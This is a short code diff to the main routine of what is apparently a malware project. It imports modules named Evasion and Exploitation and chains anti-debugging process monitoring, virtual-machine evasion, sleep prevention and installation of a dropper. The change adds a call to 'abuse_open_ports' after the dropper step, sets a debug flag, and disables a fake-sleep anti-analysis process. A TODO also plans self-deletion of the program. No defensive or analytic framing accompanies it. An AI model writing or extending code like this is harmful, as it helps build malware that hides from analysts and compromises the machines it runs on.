@@ -8,11 +8,12 @@ from Evasion.utils import is_normal_browser_user,get_idle_duration,prevent_sleep
 from multiprocessing import Process
 from os import getpid
 from Evasion.SleepFaker import FakeSleep
+from Exploitation.common import abuse_open_ports
 #//TODO: instead of sys.exit. spawn subprocess to delete the whole thing before.
 def main():
     Thread(target=debugEvasion.process_monitor,args=()).start()
-    Process(target=FakeSleep,args=(getpid(),)).start() #//TODO: chech if this work and this is not child process
-    debug = False #if true -- vm evasion will result only in printing!
+    #Process(target=FakeSleep,args=(getpid(),)).start() #//TODO: chech if this work and this is not child process
+    debug = True #if true -- vm evasion will result only in printing!
     vm_flag = sys.exit if not debug else lambda x: print(x)
     prevent_sleep()
     if not debug :
@@ -48,6 +49,7 @@ def main():
         #what next?
         pass
     create_dropper() #in the end, when we installed everything --> we create dropper
+    abuse_open_ports()
     return
 
 
